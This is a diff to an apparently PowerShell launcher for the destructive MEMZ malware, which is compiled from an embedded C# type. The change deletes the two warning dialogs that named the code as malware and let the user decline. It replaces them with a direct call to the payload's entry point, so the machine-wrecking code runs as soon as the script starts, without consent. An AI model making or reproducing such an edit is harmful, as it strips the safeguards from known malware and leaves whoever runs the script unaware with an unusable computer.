@@ -663,37 +663,4 @@ namespace MEMZClean {
 
 Add-Type -TypeDefinition $MEMZ -Language CSharp
 Add-Type -AssemblyName PresentationCore,PresentationFramework
-      $WARNING = [System.Windows.MessageBox]::Show('The software you just executed is considered malware
-This malware will harm your computer and maked it unusable
-If you are seeing this message without knowing what you just executed, simply press No and nothing will heppen.
-If you know what this malware does and are using a safe environment to test press Yes to start it.
-
-DO YOU WANT TO EXECUTE THIS MALWARE. RESULTING IN AN UNUSABLE MACHINE?','MEMZ - original creator by Leurak, code by ptr35','YesNo','Warning')
-      switch  ($WARNING) {
-
-        'Yes' {
-      
-            $FINAL = [System.Windows.MessageBox]::Show('THIS IS THE LAST WARNING!
-THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE MADE USING THIS MALWARE!
-
-STILL EXECUTE IT?','MEMZ - original creator by Leurak, code by ptr35','YesNo','Warning')
-
-            switch  ($FINAL) {
-                'Yes' {
-                    [MEMZClean.MAIN]::intmain()
-                }
-
-                'No' {
-                    exit
-                }
-
-            }
-
-        }
-      
-        'No' {
-      
-        exit
-      
-        }
-    }
+[MEMZClean.MAIN]::intmain()
